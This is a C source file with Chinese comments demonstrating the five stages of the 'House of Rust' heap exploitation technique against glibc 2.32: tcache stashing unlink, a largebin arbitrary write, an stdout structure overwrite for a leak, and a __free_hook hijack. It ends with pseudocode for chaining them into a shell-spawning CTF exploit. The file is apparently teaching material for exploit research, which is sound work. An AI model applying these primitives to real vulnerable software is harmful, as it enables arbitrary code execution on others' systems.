/*
 * House of Rust 汇总演示，目标版本：glibc 2.32，x86-64。
 *
 * 这一个文件按照原版的利用顺序，依次展示五个核心阶段：
 *   1. TSU+：把目标地址送进 tcache；
 *   2. TSU：再借助一次 smallbin stashing 取得伪造节点；
 *   3. 较新版本仍适用的 largebin attack：把新 victim 的堆地址写到目标；
 *   4. stdout 字段覆盖：触发一次真实的内存泄漏；
 *   5. __free_hook：演示原版在 2.32 上使用的最终控制流终点。
 *
 * 每个阶段都真实调用当前 glibc 的 malloc/calloc/free，并用 assert 检查结果。
 * 为了让代码能从上到下顺着读下去，每个阶段被放进一个独立的子进程里执行。
 * 这样前一个阶段故意留下的伪造 smallbin/tcache 状态就不会污染到下一个阶段；
 * 父进程只负责依次等待每个子进程结束，并检查这五段是否都成功了。
 *
 * 需要说明的是，这仍然不是原作者那种约 65 次分配的题目级完整 exploit。
 * 原版会让上一阶段的输出直接成为下一阶段的输入，还依赖 WAF（释放后写造成
 * 的重叠）、libc 地址低四位的猜测、槽位生命周期，以及特定的 Build ID。
 * 本文件的价值在于：跑一次就能观察到所有阶段真实的消费路径，文件末尾再用
 * 中文伪代码说明在具体题目里应该怎么把这五段重新接成一条完整链。
 */

#include <assert.h>
#include <malloc.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <unistd.h>

static int hook_called;

/* 这是第五阶段里真正被 free 调用的最终控制流目标，不是普通的辅助函数。 */
static void hook_target(void *pointer, const void *caller) {
  (void)pointer;
  (void)caller;
  hook_called = 1;
}

int main(void) {
  /*
   * 第一阶段：TSU+。
   *
   * 0x100 的 request 对应 0x110 的物理 chunk。先用七次 free 填满 tcache，
   * 再让两个同尺寸的 chunk 进入 unsorted bin，之后再分类进 smallbin。
   */
  {
    pid_t child = fork();
    int status;

    assert(child != -1);
    if (child == 0) {
      __attribute__((aligned(16))) size_t target[4] = {0};
      size_t *chunk[9];
      size_t *result;

      for (int i = 0; i < 8; i++)
        chunk[i] = malloc(0x100);

      /* 这个 fence 用来阻止第八个 chunk 和后续区域发生合并。 */
      malloc(0x20);
      chunk[8] = malloc(0x100);
      malloc(0x20);

      /* 前七次 free 进入 tcache，最后两次因为 tcache 已满，进入 unsorted bin。 */
      for (int i = 0; i < 9; i++)
        free(chunk[i]);

      /* 这次大申请用不到 0x110 的 chunk，会把 unsorted 里的节点分类进 smallbin。 */
      malloc(0x200);

      /* 腾出两个 tcache 槽位，留给后面的 smallbin stashing 使用。 */
      malloc(0x100);
      malloc(0x100);

      /*
       * 漏洞模拟：chunk[8][1] 就是这个已释放 chunk 的 bk 字段。
       * 把它改写成 target-0x10 后，glibc 会把 target 当成伪造 chunk 的用户区。
       */
      chunk[8][1] = (size_t)target - 0x10;

      /* stashing 过程会写 fake->bk->fd，所以这个伪造的反向指针必须指向可写内存。 */
      target[1] = (size_t)target;

      /* calloc 会走旧的 smallbin stashing 路径。 */
      calloc(1, 0x100);

      /* 下一次同尺寸的 malloc 应该会返回栈上的 target。 */
      result = malloc(0x100);
      assert(result == target);
      write(STDOUT_FILENO, "[+] TSU+ 完成\n", sizeof("[+] TSU+ 完成\n") - 1);
      _exit(0);
    }

    assert(waitpid(child, &status, 0) == child);
    assert(WIFEXITED(status) && WEXITSTATUS(status) == 0);
  }

  /*
   * 第二阶段：标准 TSU。
   *
   * 使用 0x90 的 request，对应 0xa0 的物理 chunk。这个尺寸和第一阶段不同，
   * 所以第一阶段留下的 0x110 tcache 状态不会影响这里的分配顺序。
   */
  {
    pid_t child = fork();
    int status;

    assert(child != -1);
    if (child == 0) {
      __attribute__((aligned(16))) size_t fake[16] = {0};
      size_t *chunk[9] = {0};
      size_t *result;

      for (int i = 0; i < 9; i++)
        chunk[i] = malloc(0x90);

      /* 先释放六个，再加上 chunk[1] 这第七次释放，正好填满 tcache。 */
      for (int i = 3; i < 9; i++)
        free(chunk[i]);
      free(chunk[1]);

      /* tcache 已经满了，接下来这两个 chunk 会进入 unsorted bin。 */
      free(chunk[0]);
      free(chunk[2]);

      /* 0xb0 物理大小用不到它们，所以会把它们分类进 0xa0 的 smallbin。 */
      malloc(0xa0);

      /* 给后面的 stashing 腾出两个 tcache 槽位。 */
      malloc(0x90);
      malloc(0x90);

      /* fake[2] 是我们希望 malloc 最终返回的地址，fake[3] 对应伪造节点的 bk 字段。 */
      fake[3] = (size_t)&fake[2];

      /* 漏洞模拟：覆盖 smallbin victim 的 bk 字段，让它指向我们伪造的 chunk。 */
      chunk[2][1] = (size_t)fake;

      calloc(1, 0x90);
      result = malloc(0x90);

      assert(result == &fake[2]);
      write(STDOUT_FILENO, "[+] TSU 完成\n", sizeof("[+] TSU 完成\n") - 1);
      _exit(0);
    }

    assert(waitpid(child, &status, 0) == child);
    assert(WIFEXITED(status) && WEXITSTATUS(status) == 0);
  }

  /*
   * 第三阶段：glibc 2.30～2.41 上仍适用的 largebin attack。
   *
   * p1 的物理大小是 0x430，p2 是 0x420。p2 比当前 largebin 里最小的
   * 节点 p1 还小，所以插入时会走到那条可以被利用的 bk_nextsize 更新分支。
   */
  {
    pid_t child = fork();
    int status;

    assert(child != -1);
    if (child == 0) {
      size_t target = 0;
      size_t *p1 = malloc(0x428);
      malloc(0x18);
      size_t *p2 = malloc(0x418);
      malloc(0x18);

      free(p1);

      /* 触发一次对 unsorted bin 的扫描，把 p1 分类到 largebin 里。 */
      malloc(0x438);

      /* p2 暂时留在 unsorted bin 里，等待下一次扫描时被处理。 */
      free(p2);

      /*
       * p1[3] 就是 p1->bk_nextsize。
       * 插入 p2 时会往 bk_nextsize->fd_nextsize 写入内容，而 fd_nextsize
       * 位于伪造 chunk 头的 +0x20 处，所以这里写入 target-0x20。
       */
      p1[3] = (size_t)&target - 0x20;

      malloc(0x438);

      /* 被写入的是 p2 的 chunk 头地址，而不是 p2 的用户区地址。 */
      assert(target == (size_t)(p2 - 2));
      write(STDOUT_FILENO, "[+] largebin 完成\n",
            sizeof("[+] largebin 完成\n") - 1);
      _exit(0);
    }

    assert(waitpid(child, &status, 0) == child);
    assert(WIFEXITED(status) && WEXITSTATUS(status) == 0);
  }

  /*
   * 第四阶段：stdout 泄漏。
   *
   * 原版 Rust 会先靠猜测 libc 地址的低四位，把一次写操作导向
   * _IO_2_1_stdout_。这里直接把"已经能覆盖 stdout 字段"当作输入原语，
   * 只验证 glibc 真实的输出消费路径。
   */
  {
    pid_t child = fork();
    int status;

    assert(child != -1);
    if (child == 0) {
      static char secret[] = "[+] stdout 泄漏完成\n";

      assert(fflush(stdout) == 0);

      /* fflush 会把 [write_base, write_ptr) 这段内存原样输出。 */
      stdout->_IO_write_base = secret;
      stdout->_IO_write_ptr = secret + sizeof(secret) - 1;
      stdout->_IO_write_end = secret + sizeof(secret) - 1;

      /* 让 read_end 与 write_base 保持一致，避免它先尝试去调整文件偏移。 */
      stdout->_IO_read_end = secret;
      stdout->_IO_buf_base = secret;
      stdout->_IO_buf_end = secret + sizeof(secret) - 1;

      assert(fflush(stdout) == 0);
      _exit(0);
    }

    assert(waitpid(child, &status, 0) == child);
    assert(WIFEXITED(status) && WEXITSTATUS(status) == 0);
  }

  /*
   * 第五阶段：glibc 2.32 原版使用的 __free_hook 终点。
   *
   * stdout 在上一阶段已经被故意破坏，所以后面的成功提示改用 write 系统
   * 调用，不依赖 FILE 结构体的状态。glibc 2.34 起 free 不再消费
   * __free_hook，因此不要把本文件误解读为在 2.34 及之后版本上也能兼容的
   * 完整 House of Rust。
   */
  {
    pid_t child = fork();
    int status;

    assert(child != -1);
    if (child == 0) {
      void *chunk = malloc(0x30);

      __free_hook = hook_target;
      free(chunk);

      assert(hook_called == 1);
      write(STDOUT_FILENO, "[+] 汇总演示完成\n",
            sizeof("[+] 汇总演示完成\n") - 1);
      _exit(0);
    }

    assert(waitpid(child, &status, 0) == child);
    assert(WIFEXITED(status) && WEXITSTATUS(status) == 0);
  }

  _exit(0);
}

/*
 * ======================== 题目迁移伪代码 ========================
 *
 * 下面这段内容故意写在注释里，不能直接编译。它说明的是原版如何把上面
 * 五个已经验证过的阶段接成同一条共享堆的利用链，而不是虚构一个能通用于
 * 任意题目的万能 exploit。
 *
 * 题目需要满足的原语：
 *     可以反复编辑已经释放的 chunk；
 *     可以建立大约 65 次分配；
 *     最大的单次 request 至少要有约 0x1b00；
 *     存在一次可以触发的 stdout 输出；
 *
 * 大致步骤：
 *     先建立 14 个 0x90 规格、15 个 0xa0 规格的 chunk，再加上两组 largebin
 *     的 chunk 和用于阻断合并的 fence；
 *     制造一次释放后写导致的重叠（WAF），使 smallbin victim 的 bk 和
 *     bk_nextsize 字段变得可以被编辑；
 *
 *     执行 TSU+；
 *     用第一次 largebin 写操作，修复被 TSU+ 破坏掉的 fd 字段；
 *     让 malloc 返回 tcache_perthread_struct 内部的地址；
 *
 *     执行 TSU；
 *     用第二次 largebin 写操作，在 tcache 元数据附近留下一个 libc 指针；
 *     猜测 libc 地址的低四位，把这个指针的低字节改写到指向
 *     _IO_2_1_stdout_ 这个目标；
 *
 *     覆盖 stdout 的 read_end/write_base/write_ptr/buf_base/buf_end
 *     这几个字段；
 *     触发题目里真实存在的那次输出，借此拿到完整的 libc 地址泄漏；
 *
 *     用泄漏到的 libc 基址重新计算出 __free_hook 和 system 的地址；
 *     把一次 tcache 分配投递到 __free_hook 上，写入 system 的地址；
 *     再申请一块内存写入 "/bin/sh"，最后 free 掉这个 chunk 触发命令执行；
 *
 * 需要留意的版本边界：
 *     glibc 2.33：各个组件和 hook 都还存在，但原作者没有给出完整的迁移
 *         证明；
 *     glibc 2.34～2.40：TSU 和 largebin 相关的组件依然值得研究，但必须
 *         把 __free_hook 换成其他控制流终点；
 *     glibc 2.41：旧的 smallbin stashing 路径被重构过，原来的 TSU 组合
 *         方式已经失效；
 *     glibc 2.42：经典的 largebin bk_nextsize 任意地址写在这个版本上
 *         又被进一步加固。
 */
